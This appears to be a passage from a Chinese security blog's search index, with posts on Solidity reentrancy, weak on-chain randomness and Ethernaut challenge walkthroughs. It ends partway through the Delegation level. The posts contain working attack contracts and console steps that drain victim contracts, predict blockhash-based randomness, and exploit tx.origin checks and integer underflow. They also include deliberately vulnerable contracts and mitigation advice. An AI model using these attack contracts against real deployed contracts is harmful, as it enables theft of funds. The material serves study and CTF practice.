[{"title":"智能合约重入漏洞","url":"/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/","content":"智能合约重⼊漏洞原理分析外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被”重入“，因此合约会出现不可预知的行为。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果。\nfunction withdraw(uint _amount) public &#123;\trequire(balances[msg.sender] &gt;= _amount)\tmsg.sender.call.value(_amount)();\tbalances[msg.sender] -= _amount;&#125;\n\n\n其中，fallback函数是关键\nfallback函数当我们调用某个智能合约时，如果指定的函数找不到，或者根本就没指定调用哪个函数（如向合约发送 ether）时，fallback 函数就会被调用。\n向合约发送 send、transfer、call 消息时候都会调用 fallback 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 fallback 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 fallback 函数，这有可能导致循环调用。\n而fallback函数是可以被重写的\n如果构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）\n漏洞demopragma solidity ^0.6.10;contract Victim &#123;\tmapping(address =&gt; uint) public balances;\taddress public owner;        //构造函数，设定合约所有者    constructor() public &#123;        owner = msg.sender;    &#125;\t\t//接收资金转入\tfunction deposit() public payable &#123;\t\tbalances[msg.sender] += msg.value;\t&#125;\t\t//提款\tfunction withdraw(uint _amount) public &#123;\t\trequire(balances[msg.sender] &gt;= _amount);\t\tmsg.sender.call&#123;value: _amount&#125;(&quot;&quot;);\t\tbalances[msg.sender] -= _amount;\t&#125;\t\t//查询余额\tfunction getBalance() public view returns(uint) &#123;\t\treturn address(this).balance;\t&#125;&#125;\n\n攻击合约contract Attack &#123;\tVictim public victim;\t\t//设定受害者合约地址\tconstructor(address _victimAddress) public &#123;\t\tvictim = Victim(_victimAddress);\t&#125;\t\t//重写fallback\tfallback() external payable &#123;\t\tif(address(victim).balance &gt;= 1 ether)&#123;\t\t\tvictim.withdraw(1 ether);\t\t&#125;\t&#125;\t\t//攻击，调用受害者的withdraw函数\tfunction attack() external payable &#123;\t\trequire(msg.value &gt;= 1 ether);\t\tvictim.deposit&#123;value: 1 ether&#125;();\t\tvictim.withdraw(1 ether);\t&#125;\t\t//查询余额\tfunction getBalance() public view returns(uint) &#123;\t\treturn address(this).balance;\t&#125;&#125;\n\n复现过程虚拟机中\n分别为受害者和攻击者创建一个合约\n\n\n\n用deposit函数为受害者设定一定余额\n\n\n\n检查受害者余额\n\n\n\n进行攻击\n\n\n\n检查攻击者和受害者的余额\n\n\n\n测试链上\n部署受害者合约\n\n\n\n部署攻击者合约\n\n\n为受害者合约打入2eth\n\n\n\n\n攻击\n\n\n\n结果\n\n\n\n\n重入次数由于gas的限制，重入次数是有一定限制的\n调整参数，实验出最高重入次数\n可以在区块链浏览器上查询到重入的次数\n\n大约是9次\n注意，一旦 out of gas 就会攻击失败。\n规避建议方法一总是用 send()或transfer() 来发送 ether，而不是用 call.value()。因为transfer和send函数的gas仅有2300，这点gas仅够捕获一个event，所以将无法进行可重入攻击。\n方法二确保在执行外部调用之前已经更新了所有的内部状态，这一模式被称为：Checks-Effects-Interactions（“检查-生效-交互”）\n第一步，大多数函数会先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的以太币Ether ，用户是否具有token等等）。这些检查工作应该首先被完成。\n第二步，如果所有检查都通过了，接下来进行更改合约状态变量的操作。\n第三步，与其它合约的交互应该是任何函数的最后一步。\nrequire(balances[msg.sender] &gt; amount); //检查require(this.balance &gt; amount); //检查balances[msg.sender] -= amount; // 生效to.call.value(amount)();  // 交互\n\n方法三\n使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，可防止重入调用\n\nbool reEntrancyMutex = false;function withdraw(uint _amount) public &#123;\trequire(!reEntrancyMutex);\treEntrancyMutex = true;\trequire(balances[msg.sender] &gt;= _amount);\tmsg.sender.call&#123;value: _amount&#125;(&quot;&quot;);\tbalances[msg.sender] -= _amount;\treEntrancyMutex = false;&#125;\n\n\n使用OpenZeppelin官方的ReentrancyGuard合约的nonReentrant modifier。\n\n在函数中增加nonReentrant modifier可保证其不可重入，任何对该函数的重入操作都将以revert the call的方式来拒绝。\n当合约中有多个函数时，由于modifier的粒度在单个函数，若想完全避免重入，应对每个函数都添加nonReentrant modifier。否则，仍然可以通过其他函数来重入然后发起重入攻击，若该函数可能破坏不变量。\n// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.3.2 (security/ReentrancyGuard.sol)pragma solidity ^0.8.0;/** * @dev Contract module that helps prevent reentrant calls to a function. * * Inheriting from `ReentrancyGuard` will make the &#123;nonReentrant&#125; modifier * available, which can be applied to functions to make sure there are no nested * (reentrant) calls to them. * * Note that because there is a single `nonReentrant` guard, functions marked as * `nonReentrant` may not call one another. This can be worked around by making * those functions `private`, and then adding `external` `nonReentrant` entry * points to them. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. */abstract contract ReentrancyGuard &#123;    // Booleans are more expensive than uint256 or any type that takes up a full    // word because each write operation emits an extra SLOAD to first read the    // slot&#x27;s contents, replace the bits taken up by the boolean, and then write    // back. This is the compiler&#x27;s defense against contract upgrades and    // pointer aliasing, and it cannot be disabled.    // The values being non-zero value makes deployment a bit more expensive,    // but in exchange the refund on every call to nonReentrant will be lower in    // amount. Since refunds are capped to a percentage of the total    // transaction&#x27;s gas, it is best to keep them low in cases like this one, to    // increase the likelihood of the full refund coming into effect.    uint256 private constant _NOT_ENTERED = 1;    uint256 private constant _ENTERED = 2;    uint256 private _status;    constructor() &#123;        _status = _NOT_ENTERED;    &#125;    /**     * @dev Prevents a contract from calling itself, directly or indirectly.     * Calling a `nonReentrant` function from another `nonReentrant`     * function is not supported. It is possible to prevent this from happening     * by making the `nonReentrant` function external, and making it call a     * `private` function that does the actual work.     */    modifier nonReentrant() &#123;        // On the first call to nonReentrant, _notEntered will be true        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);        // Any calls to nonReentrant after this point will fail        _status = _ENTERED;        _;        // By storing the original value once again, a refund is triggered (see        // https://eips.ethereum.org/EIPS/eip-2200)        _status = _NOT_ENTERED;    &#125;&#125;\n\n\n使用采用pull payment模式，OpenZeppelin提供了PullPayment合约。\n\n其提供了_asyncTransfer函数，与transfer类似。然而，它不会将资金发送给接收者，而是将其转移到托管合约中。此外，PullPayment还为接收者提供了一个公共功能来提取（pull）他们的支付：withdrawPayments。\n// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.3.2 (security/PullPayment.sol)pragma solidity ^0.8.0;import &quot;../utils/escrow/Escrow.sol&quot;;/** * @dev Simple implementation of a * https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls[pull-payment] * strategy, where the paying contract doesn&#x27;t interact directly with the * receiver account, which must withdraw its payments itself. * * Pull-payments are often considered the best practice when it comes to sending * Ether, security-wise. It prevents recipients from blocking execution, and * eliminates reentrancy concerns. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. * * To use, derive from the `PullPayment` contract, and use &#123;_asyncTransfer&#125; * instead of Solidity&#x27;s `transfer` function. Payees can query their due * payments with &#123;payments&#125;, and retrieve them with &#123;withdrawPayments&#125;. */abstract contract PullPayment &#123;    Escrow private immutable _escrow;    constructor() &#123;        _escrow = new Escrow();    &#125;    /**     * @dev Withdraw accumulated payments, forwarding all gas to the recipient.     *     * Note that _any_ account can call this function, not just the `payee`.     * This means that contracts unaware of the `PullPayment` protocol can still     * receive funds this way, by having a separate account call     * &#123;withdrawPayments&#125;.     *     * WARNING: Forwarding all gas opens the door to reentrancy vulnerabilities.     * Make sure you trust the recipient, or are either following the     * checks-effects-interactions pattern or using &#123;ReentrancyGuard&#125;.     *     * @param payee Whose payments will be withdrawn.     */    function withdrawPayments(address payable payee) public virtual &#123;        _escrow.withdraw(payee);    &#125;    /**     * @dev Returns the payments owed to an address.     * @param dest The creditor&#x27;s address.     */    function payments(address dest) public view returns (uint256) &#123;        return _escrow.depositsOf(dest);    &#125;    /**     * @dev Called by the payer to store the sent amount as credit to be pulled.     * Funds sent in this way are stored in an intermediate &#123;Escrow&#125; contract, so     * there is no danger of them being spent before withdrawal.     *     * @param dest The destination address of the funds.     * @param amount The amount to transfer.     */    function _asyncTransfer(address dest, uint256 amount) internal virtual &#123;        _escrow.deposit&#123;value: amount&#125;(dest);    &#125;&#125;\n\n","tags":["智能合约","漏洞"]},{"title":"智能合约错误随机性","url":"/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/","content":"错误随机性智能合约开发中，在程序中使用随机数较好的伪随机数是很难的。很多看似无法被预言的随机数种子或变量，实际被预言的难度很低。\n核心问题：一旦在智能合约中使用了随机性很差的随机数作为关键变量，就面临着随机数被预言的攻击风险。\nPRNG相关漏洞类型开发者生成随机数时，一般都会使用伪随机数生成器(pseudo-random number generator)，简称 PRNG。而有漏洞的PRNG，一般有三种类型：\n\n\n使用区块变量作为熵源的 PRNG\n\n基于过往区块(和私有种子)的区块哈希的 PRNG\n\n易被抢占交易(front-running)的 PRNG\n\n\n\n使用区块变量作为熵源\nblock.coinbase 表示当前区块的矿工地址\nblock.difficulty 表示当前区块的挖掘难度\nblock.gaslimit 区块内交易的最大限制燃气消耗量\nblock.number 表示当前区块高度\nblock.timestamp 表示当前区块挖掘时间\n\n以上所有的区块变量都可以被矿工操纵，所以都不能用来做信息熵源。因为这些区块变量在同一区块上是共用的。攻击者通过其恶意合约调用受害者合约，那么此交易打包在同一区块中，其区块变量是一样的。\n基于过往区块的区块哈希每一个Ethereum区块链上的区块都有认证的hash值，通过 block.blockhash() 函数可以获取此值。此函数经常被错误地使用。\n\nblock.blockhash(block.number) ：基于当前区块的区块哈希\nblock.blockhash(block.number - 1) ： 基于负一区块的区块哈希\nBlockhash of a future block : 使用未来区块的区块哈希\nBlockhash with a private seed : 使用一个私有种子(seed)变量\n\n基于当前区块的区块哈希通过 block.number 变量可以获取当前区块区块高度。但是还没执行时，这个“当前区块”是一个未来区块，即只有当一个矿工拾取一个执行合约代码的交易时，这个未来区块才变为当前区块，所以合约才可以可靠地获取此区块的区块哈希。而一些合约曲解了block.blockhash(block.number) 的含义，误认为当前区块的区块哈希在运行过程中是已知的，并将之做为熵源。还有一点就是在以太坊虚拟机中(EVM)，区块哈希恒为 0。\n基于负一区块的区块哈希uint256 random = uint256(keccak256(block.blockhash(block.number - 1)));\n\n这样的方式，虽然理论上可以获得随机数，但这个随机数是不安全的。因为攻击者可以使用改造后的FullNode，让这笔交易可以在FullNode上执行，并获得结果后，再选择性广播那些可以符合攻击者期望的交易，即可以操纵交易的执行结果。\n攻击合约只要以相同代码执行，即可以产生到同样的伪随机数。\n使用未来区块的区块哈希第一笔交易触发合约，合约存储某个未来区块高度。\n第二笔交易，合约检索当前区块高度，如果超过了存储的未来区块高度，则通过区块哈希获得伪随机数结果。\n然而，这种方式也有它的局限性：在TVM中，blockhash被限定为只能获取近256个高度区块的数据，因此在以上的两笔交易间隔超过256 * 3s，大约12.8分钟后，这种方式就会失效。\n此方法只有在十分必要的时候才能使用。因为也存在一定危险性，EVM 能存储的区块哈希为最近的 256 条。超过的话值为 0。\n易被抢占交易(front-running)原理：更高的 gas 价格，交易将更快被矿工拾取打包。\n为了获取最大的奖励，矿工通过每个交易的 gas 累积值来选择并创建新的区块。而这些交易的排序是基于它们的 gas 价格。最高的 gas 价格会先被执行。由此通过操纵 gas 价格，可以将交易的顺序排在当前区块的前面。这就会引发抢占交易问题。\n复现前提Ganache CLI使用ethereumjs来模拟完整的客户端行为，使开发以太坊应用程序更快，更轻松，更安全。它还包括所有主流的RPC函数和功能（如event），并可以准确地运行以使开发变得容易。\n在后文的复现中，由于在remix中使用VM会报错，所以会使用ganache-cli来进行模拟。\nganache-cli是用Javascript编写的，并通过npm作为Node包进行分发。安装之前首先要确保安装了Node.js（&gt; = v6.11.5），可以使用node -v来检查自己的Node.js的版本\n安装\nnpm install -g ganache-cli\n\n\n启动\nganache-cli\n\n\n漏洞demopragma solidity ^0.6.10;contract GuessTheRandomNumber &#123;    constructor() public payable &#123;            &#125;        //s    function guess(uint guess) public &#123;        uint answer = uint(keccak256(abi.encodePacked(            blockhash(block.number - 1),            block.timestamp            )));                    if (guess == answer) &#123;            (bool sent, ) = msg.sender.call&#123;value: 1 ether&#125;(&quot;&quot;);            require(sent, &quot;Failed to send Ether&quot;);        &#125;    &#125;&#125;\n\n攻击合约pragma solidity ^0.6.10;contract Attack &#123;    fallback() external payable &#123;            &#125;        function attack(GuessTheRandomNumber guessTheRandomNumber) public &#123;        uint answer = uint(keccak256(abi.encodePacked(            blockhash(block.number - 1),            block.timestamp            )));                    guessTheRandomNumber.guess(answer);    &#125;        function getBalance() public view returns (uint) &#123;        return address(this).balance;    &#125;&#125;\n\n复现过程\n在remix中运行的时候选择Web3 Provider，注意这里的Web3 Provider Endpoint应匹配使用ganache-cli中的端口\n\n\n\n分别为攻击者和受害者创建智能合约\n\n\n\n输入受害者合约地址进行攻击后，即可看到猜测成功，余额增加\n\n\n较安全伪随机数的产生方法hash-commit-revealhash-commit-reveal被很多合约开发者视为随机数的最佳实践方案，已经被广泛应用于大量的DAPP中，这里我们来看看它的工作原理。\nhash-commit-reveal的本质，是合约调用者和随机数提供者（通常情况下是某外部预言机）在波场区块链平台上通过一系列协议来生成随机数。\nDice2Win采用混合模式, 巧妙地解决随机数弱, 且容易被预测的问题. 其整个流程如下:　　　　1. 玩家指定行动计划, 并生产对应的hash值.　　2. 服务端收到玩家的hash值, 产生随机值reveal, 然后根据reveal生产commit值, 把这个返回给玩家　　3. 玩家带着commit和行动信息, 在智能合约下真正下注　　4. 服务端发起结算, 带着真正的reveal值去结算　　中间的行动计划和reveal没法中途修改, 因为有hash值的验证　　其本质的思想是hash-commit-reveal, 其核心的思想是: 服务端不知道玩家的行为, 玩家不知道服务端真正的随机数. 而最终结果在合约里验证hash, 并给出预期的结果. 这样的流程, 保证玩家和服务端都满意。\n此类随机数生成策略的缺点也是很明显的：高度依赖于预言机（secretSigner）对合约的回调。因此，预言机有选择性回调的作恶风险。\nOraclizeOraclize定位为去中心化应用的数据搬运工，它作为Web APIs和DApp的可靠链接，有了Oraclize，就不需要建立额外的信任链，因为我们的行为已经被强制加密验证。\nOraclize 提供了一个连接以太坊与外部环境(互联网)的桥梁。通过 Oraclize，智能合约能够通过 web API 请求数据。如当前的兑换率，天气预报或股票价格。其中一个最大的作用是能提供伪随机数。一些合约通过 Oraclize 中的 URL 连接器来连接 random.org 来获取伪随机数。\nOraclize是一个可证明的诚实的预言机服务，可以让智能合约访问互联网，Oraclize是平台无关的，为所有主流的智能合约平台提供一种虚拟的接口，通过Oraclize投入大量有意义的数据到区块链中，可以使得智能合约产业更加繁荣，让更多有价值的应用呈现更大的生命力，Oraclize的使用方式可以参考下面的代码：\nhttps://github.com/oraclize/ethereum-examples/blob/master/solidity/random-datasource/randomExample.sol\n/*   Oraclize random-datasource example   This contract uses the random-datasource to securely generate off-chain N random bytes*/pragma solidity ^0.4.11;import &quot;github.com/oraclize/ethereum-api/oraclizeAPI.sol&quot;;contract RandomExample is usingOraclize &#123;        event newRandomNumber_bytes(bytes);    event newRandomNumber_uint(uint);         function RandomExample() &#123;        oraclize_setProof(proofType_Ledger); // sets the Ledger authenticity proof in the constructor        update(); // let&#x27;s ask for N random bytes immediately when the contract is created!    &#125;        // the callback function is called by Oraclize when the result is ready    // the oraclize_randomDS_proofVerify modifier prevents an invalid proof to execute this function code:    // the proof validity is fully verified on-chain    function __callback(bytes32 _queryId, string _result, bytes _proof)    &#123;         // if we reach this point successfully, it means that the attached authenticity proof has passed!        if (msg.sender != oraclize_cbAddress()) throw;                if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) &#123;            // the proof verification has failed, do we need to take any action here? (depends on the use case)        &#125; else &#123;            // the proof verification has passed            // now that we know that the random number was safely generated, let&#x27;s use it..                        newRandomNumber_bytes(bytes(_result)); // this is the resulting random number (bytes)                        // for simplicity of use, let&#x27;s also convert the random bytes to uint if we need            uint maxRange = 2**(8* 7); // this is the highest uint we want to get. It should never be greater than 2^(8*N), where N is the number of random bytes we had asked the datasource to return            uint randomNumber = uint(sha3(_result)) % maxRange; // this is an efficient way to get the uint out in the [0, maxRange] range                        newRandomNumber_uint(randomNumber); // this is the resulting random number (uint)        &#125;    &#125;        function update() payable &#123;         uint N = 7; // number of random bytes we want the datasource to return        uint delay = 0; // number of seconds to wait before the execution takes place        uint callbackGas = 200000; // amount of gas we want Oraclize to set for the callback function        bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas); // this function internally generates the correct oraclize_query and returns its queryId    &#125;&#125;\n\n考虑一个提供打赌的智能合约，用户调用打赌的接口，这个接口会把用户的请求存储起来，然后调用Oracle随机数生成服务，然后通过Oracle回调服务，判断随机数是否大于某个值，如果成立，那么用户成功，否则用户失败，这就是典型的Oracle的使用案例。\nRandaoRANDAO 机制就是，当用户通过储存（质押）32 ETH 成为验证者之后，该用户可以任意选定一个随机数。当需要为某个区块公布随机数时，将所有验证者的随机数加起来就可以得到一个全新的随机数。\nrandao是一个DAO(去中心化的匿名组织)允许任何人加入，随机数由所有参与者一起合作生成，首先我们需要在区块链上创建一个RANDAO的智能合约，合约定义了参与规则，然后生成随机数的基本过程可以分为下面三个步骤：\n第一步：收集有效的sha3(s)：参与随机数生成的参与者，首先需要在一个指定的时间区间(比如6个区块的区间，大约72秒)发送m ETH作为抵押到智能合约C，同时发送一个sha3(s)的值到智能合约C ，s是一个只有参与者自己知道的数字第二步:收集有效的s，在第一步结束后，那些提交了sha3(s)的参与者需要在指定的时间区间内发送s到智能合约C，智能合约C会检查sha3(s)和之前提交的值是否相同，相同的s会被保存到种子集合用来最终生成随机数。第三步:计算随机数并退回抵押和奖金，在所有的秘密数字s被成功收集后，智能合约C会使用函数f(s1,s2,…,sn)来计算随机数，随机数的结果会写入智能合约的存储，而且结果会被发送到所有之前请求随机数的其他智能合约上面，智能合约C会把第一阶段的抵押返回给参与者，然后奖金会被分成同等分发送给所有的参与者，奖金来源于请求随机值的其他智能合约。\nRNG补充规则：\n为了确保RNG不能被操控，以及为了安全和效率，智能合约C有以下的补充规则：\n在第一步中，如果有两个或更多个的同样的sha3(s)被提交上来，那么只有第一个会被接受在第一步中，对于参与者有最低要求，如果在指定时间区间内没有收集到足够多的sha3(s)的值，那么RNG在这个区块高度会失败如果参与者提交了sha3(s),那么他必须在第二步提交s如果参与者在第二步没有提交s，那么第一阶段提供的m ETH会被没收而且没有奖励如果一个或者多个s没有在第二步被提交，RNG在这个区块高度会失败，没收的ETH会被分成同等分发送给提交了s的其他参与者，其他申请随机数的其他合约的费用会被退回\nRNG激励机制：\nRNG的周期非常短，例如一个小时20个生成周期，如果没有周期的利润是0.001%,一个月的盈利会达到0.00001 * 20 * 24 * 30 = 0.144，为了达到14.4%每个月的盈利，并且RNG平均有n个参与者，运行智能合约C的费用为n * 3 * 500 * gasPrice + Ccost，CCost是合约内部的gas消费，包括计算和存储)假设每个随机值平均有r个请求，每个请求的费用是p ETH, 那么收入是r*p. 所以每个参与者每一次参与会收到rp - 1500n * gasPrice - Ccost)/n,当前的gasPrice是10 szabo, 合约的消费大概是1500n gas， 所以大概的净收入是(rp/n-0.03)ETH. 假设每个RNG有10个参与者，并且抵押是1000ETH，所以如果RNG如果只请求一次，那么一次的费用是0.4 ETH, 如果请求是10次，那么一次请求的价格会被降到0.04ETH\nRANDAO作为以太坊系统的基础设施，被其他的合约调用，不同的合约因为有不同的目的所以需要不同的随机值，有些需要高度加密的，比如说抽奖;有些需要稳定的回应，并且要求立即作出回应,这些合约本身的价值不高;有些需要回调函数，当随机值已经生成的时候需要接收到通知。\n但即使在这种情况下，最后一个公开随机数的人也可以在一定程度上操纵随机数。最后一个人可以选择保持沉默，以这样或那样的方式改变这个最终的随机数：房间里的最后一个人可以记住之前每个人公布的数字，如此一来，就可以知道加上（或者不加上）他提供的数字之后的最终随机数结果。如果相对于其他数字，某个数字对最后一个人更有利，那最后一个人就有动机去进行某种程度的操纵，不管程度高低。\n对于这一问题，以太坊 2.0 将通过 VDF（可验证延迟函数）来解决！\n……\n","tags":["智能合约","漏洞"]},{"title":"Ethernaut闯关（上）","url":"/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/","content":"Ethernaut闯关（上）平台地址：https://ethernaut.zeppelin.solutions\n1. Fallback闯关要求\n成为合约的owner\n将余额减少为0\n\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract Fallback &#123;  using SafeMath for uint256;  mapping(address =&gt; uint) public contributions;  address payable public owner;  constructor() public &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    owner.transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n\n合约分析攻击流程\n首先点击”Get new instance”来获取一个实例\n\n查看合约地址的资产总量\nawait getBlance(instance)\n向合约转1wei，使贡献值大于0\nawait contract.contribute(&#123;value:1&#125;)\n再次获取balance，检查是否成功改变\nawait getBlance(instance)\n通过调用sendTransaction函数来触发fallback函数\nawait contract.sendTransaction(&#123;value:1&#125;)\n等交易完成后再次查看合约的owner，发现成功变为我们自己的地址\nawait contract.owner()\n调用withdraw来转走合约的所有代币\nawait contract.withdraw()\n点击”submit instance”即可完成闯关\n\n\n\n2. Fallout闯关要求获得合约所有权\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract Fallout &#123;    using SafeMath for uint256;  mapping (address =&gt; uint) allocations;  address payable public owner;  // constructor   function Fal1out() public payable &#123;    owner = msg.sender;    allocations[owner] = msg.value;  &#125;  modifier onlyOwner &#123;\t        require(\t            msg.sender == owner,\t            &quot;caller is not the owner&quot;\t        );\t        _;\t    &#125;  function allocate() public payable &#123;    allocations[msg.sender] = allocations[msg.sender].add(msg.value);  &#125;  function sendAllocation(address payable allocator) public &#123;    require(allocations[allocator] &gt; 0);    allocator.transfer(allocations[allocator]);  &#125;  function collectAllocations() public onlyOwner &#123;    msg.sender.transfer(address(this).balance);  &#125;  function allocatorBalance(address allocator) public view returns (uint) &#123;    return allocations[allocator];  &#125;&#125;\n\n合约分析构造函数名称与合约名称不一致，同时在构造函数中指定了函数调用者直接为合约的owner\n攻击流程\n点击“Get new instance”来获取示例\n\n调用构造函数来更换owner\nawait contract.Fal1out()\n点击“submit instance”来提交答案\n\n\n\n3. Coin Flip闯关要求这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract CoinFlip &#123;  using SafeMath for uint256;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor() public &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number.sub(1)));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue.div(FACTOR);    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;\n\n合约分析随机数问题\n这题就是用了block.blockhash(block.number-1)，这个表示上一块的hash，然后去除以2^255\n攻击流程pragma solidity ^0.4.18;contract CoinFlip &#123;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  function CoinFlip() public &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(block.blockhash(block.number-1));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue/FACTOR;    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;contract exploit &#123;    address public con_addr = 0x50F027e7e09791A2DbC86E38AbdC1f8FE41d7A9B; //此处是实例地址    CoinFlip expFlip = CoinFlip(con_addr);    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    function guess() public &#123;        uint256 blockValue = uint256(block.blockhash(block.number-1));        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);        bool guess = coinFlip == 1 ? true : false;        expFlip.flip(guess);    &#125;&#125;\n\n在remix中部署合约，并点击guess十次\n\n期间可使用 await contract.consecutiveWins() 来查询成功次数\n\n4. Telephone闯关要求获取合约的owner权限\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Telephone &#123;  address public owner;  constructor() public &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n\n合约分析这里涉及到了tx.origin和msg.sender的区别，前者表示交易的发送者，后者则表示消息的发送者，如果情景是在一个合约下的调用，那么这两者是木有区别的，但是如果是在多个合约的情况下，比如用户通过A合约来调用B合约，那么对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户\n攻击流程pragma solidity ^0.6.0;contract Telephone &#123;  address public owner;  constructor() public &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;contract exploit &#123;    Telephone target = Telephone(0x2b5e81876E14b3E0E1337F6BA7bc4A2d8844c904);//实例地址    function attack() public &#123;        target.changeOwner(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624);//自己的地址    &#125;&#125;\n\n可使用await contract.owner()来查询合约的owner\n\n5. Token闯关要求这一关的目标是攻破下面这个基础 token 合约\n你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好  \n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public &#123;    balances[msg.sender] = totalSupply = _initialSupply;  &#125;  function transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;  function balanceOf(address _owner) public view returns (uint balance) &#123;    return balances[_owner];  &#125;&#125;\n\n合约分析整数溢出\n这里的balances和value都是无符号整数，所以无论如何他们相减之后值依旧大于等于0\n攻击流程pragma solidity ^0.6.0;contract Token &#123;  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public &#123;    balances[msg.sender] = totalSupply = _initialSupply;  &#125;  function transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;  function balanceOf(address _owner) public view returns (uint balance) &#123;    return balances[_owner];  &#125;&#125;contract exploit &#123;    address public con_addr = 0xf36B064eB8f9120392C6b352210566D6D8340700;    address public trans_to = 0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624;    Token token = Token(con_addr);    uint overvalue = 21;    function attack() public &#123;        token.transfer(trans_to,overvalue);    &#125;&#125;\n\n\n6. Delegation闯关要求这一关的目标是申明你对你创建实例的所有权.\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate &#123;  address public owner;  constructor(address _owner) public &#123;    owner = _owner;  &#125;  function pwn() public &#123;    owner = msg.sender;  &#125;&#125;contract Delegation &#123;  address public owner;  Delegate delegate;  constructor(address _delegateAddress) public &#123;    delegate = Delegate(_delegateAddress);    owner = msg.sender;  &#125;  fallback() external &#123;    (bool result,) = address(delegate).delegatecall(msg.data);    if (result) &#123;      this;    &#125;  &#125;&#125;\n\n合约分析\nSolidity 支持两种底层调用方式 call 和 delegatecall\ncall 外部调用时，上下文是外部合约\ndelegatecall 外部调用时，上下文是调用合约\ncall 与 delegatecall 的功能类似，区别仅在于后者仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。\n函数的设计目的是为了使用存储在另一个合约的库代码。\n二者执行代码的上下文环境的不同，当使用call调用其它合约的函数时，代码是在被调用的合约的环境里执行，对应的，使用delegatecall进行函数调用时代码则是在调用函数的合约的环境里执行。\n所以 